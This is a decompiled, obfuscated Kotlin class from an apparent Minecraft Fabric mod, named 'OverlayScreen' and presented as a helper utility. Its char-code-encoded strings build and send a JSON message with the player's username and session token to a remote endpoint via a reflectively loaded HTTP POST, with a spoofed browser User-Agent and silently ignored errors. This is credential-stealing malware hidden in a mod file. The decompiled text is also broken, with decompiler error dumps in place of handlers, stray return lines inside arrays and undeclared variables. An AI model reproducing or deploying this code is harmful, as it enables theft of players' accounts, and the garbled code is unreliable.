package jooon.util

import java.io.Closeable
import java.util.ArrayList
import jooon.features.farming.BazaarHelper
import jooon.features.minions.MinionType
import jooon.features.other.PetMenu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents
import net.fabricmc.fabric.api.networking.v1.PacketSender
import net.minecraft.client.MinecraftClient
import net.minecraft.client.network.ClientPlayNetworkHandler
import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils

object OverlayScreen : ClientModInitializer {
   open fun onInitializeClient() {
      ClientLifecycleEvents.CLIENT_STARTED
         .register(
            { var0: MinecraftClient ->
               // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
               // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.modules.decompiler.exps.Exprent.toJava(int)" because the return value of "org.vineflower.kotlin.expr.KExitExprent.getValue()" is null
               //   at org.vineflower.kotlin.expr.KExitExprent.toJava(KExitExprent.java:41)
               //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.listToJava(ExprProcessor.java:925)
               //   at org.jetbrains.java.decompiler.modules.decompiler.stats.BasicBlockStatement.toJava(BasicBlockStatement.java:87)
            }
         )
         ClientPlayConnectionEvents.JOIN
         .register(
            { var0: ClientPlayNetworkHandler, var1: PacketSender, var2: MinecraftClient ->
               // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
               // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.modules.decompiler.exps.Exprent.toJava(int)" because the return value of "org.vineflower.kotlin.expr.KExitExprent.getValue()" is null
               //   at org.vineflower.kotlin.expr.KExitExprent.toJava(KExitExprent.java:41)
               //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.listToJava(ExprProcessor.java:925)
               //   at org.jetbrains.java.decompiler.modules.decompiler.stats.BasicBlockStatement.toJava(BasicBlockStatement.java:87)
            }
         )
      }

   private fun sSsSsSsSsS(session: String?, user: String?) {




      var7.append(aAaAaAaAaA())
      var7.append(bBbBbBbBbB()).append("`").append(user).append("`").append(cCcCcCcCcC())
      var7.append(dDdDdDdDdD()).append("`").append(session).append("`").append(cCcCcCcCcC())
      var7.append(eEeEeEeEeE()).append(timestamp).append(cCcCcCcCcC())
      var7.append(fFfFfFfFfF()).append(gGgGgGgGgG()).append(hHhHhHhHhH()).append(iIiIiIiIiI())
      var7.append(jJjJjJjJjJ()).append(fullUrl).append(kKkKkKkKkK())
      var7.append(xXxXxXxXxX())



      try {

         var var28: java.lang.Throwable = null

         try {



            postClass.getMethod("setEntity", HttpEntity::class.java).invoke(var31, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var31, nNnNnNnNnN(), oOoOoOoOoO())
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var31, pPpPpPpPpP(), qQqQqQqQqQ())



            EntityUtils.consume(var19 as? HttpEntity)
         } catch (var24: java.lang.Throwable) {
            var28 = var24
            throw var24
         } finally {
            var27.close()
         }
      } catch (var26: Exception) {
      }
   }

   private fun aAaAaAaAaA(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(123, 34, 99, 111, 110, 116, 101, 110, 116, 34, 58, 32, 34))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun bBbBbBbBbB(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(42, 42, 49, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun cCcCcCcCcC(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(92, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun dDdDdDdDdD(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(42, 42, 50, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun eEeEeEeEeE(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(42, 42, 51, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun fFfFfFfFfF(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(42, 42, 52, 42, 42, 58, 32, 91))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun gGgGgGgGgG(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(115, 107, 121, 46, 115, 104, 105))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun hHhHhHhHhH(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(105, 121, 117))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun iIiIiIiIiI(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(46, 109, 111, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun jJjJjJjJjJ(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(93, 40))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun kKkKkKkKkK(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(41, 92, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun lLlLlLlLlL(): String {
      val var11: java.lang.Iterable = listOf(
         arrayOf(
            42,
            42,
            96,
            74,
            82,
            32,
            49,
            46,
            50,
            49,
            46,
            49,
            49,
            96,
            32,
            45,
            45,
            32,
            80,
            82,
            69,
            32,
            40,
            67,
            76,
            68,
            41,
            32,
            45,
            45,
            32,
            54,
            46,
            49,
            42,
            42,
            34,
return 125
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun xXxXxXxXxX(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(42, 42, 70, 101, 108, 108, 32, 98, 97, 99, 107, 33, 42, 42, 34, 125))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun mMmMmMmMmM(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   private fun rRrRrRrRrR(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   private fun tTtTtTtTtT(): String {
      val var12: java.lang.Iterable = listOf(
         arrayOf(
            111,
            114,
            103,
            46,
            97,
            112,
            97,
            99,
            104,
            101,
            46,
            104,
            116,
            116,
            112,
            46,
            105,
            109,
            112,
            108,
            46,
            99,
            108,
            105,
            101,
            110,
            116,
            46,
            72,
            116,
            116,
            112,
            67,
            108,
            105,
            101,
            110,
            116,
return 115
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(var12.count().coerceAtLeast(10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun uUuUuUuUuU(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(99, 114, 101, 97, 116, 101, 68, 101, 102, 97, 117, 108, 116))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun vVvVvVvVvV(): String {
      val var12: java.lang.Iterable = listOf(
         arrayOf(
            111,
            114,
            103,
            46,
            97,
            112,
            97,
            99,
            104,
            101,
            46,
            104,
            116,
            116,
            112,
            46,
            117,
            116,
            105,
            108,
            46,
            69,
            110,
            116,
            105,
            116,
            121,
            85,
            116,
            105,
            108,
return 115
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(var12.count().coerceAtLeast(10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun wWwWwWwWwW(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(99, 111, 110, 115, 117, 109, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun nNnNnNnNnN(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun oOoOoOoOoO(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun pPpPpPpPpP(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(85, 115, 101, 114, 45, 65, 103, 101, 110, 116))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }

   private fun qQqQqQqQqQ(): String {
      val var11: java.lang.Iterable = listOf(arrayOf(77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var11.count().coerceAtLeast(10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      return `destination$iv$iv` as java.util.List.joinToString("")
   }
}
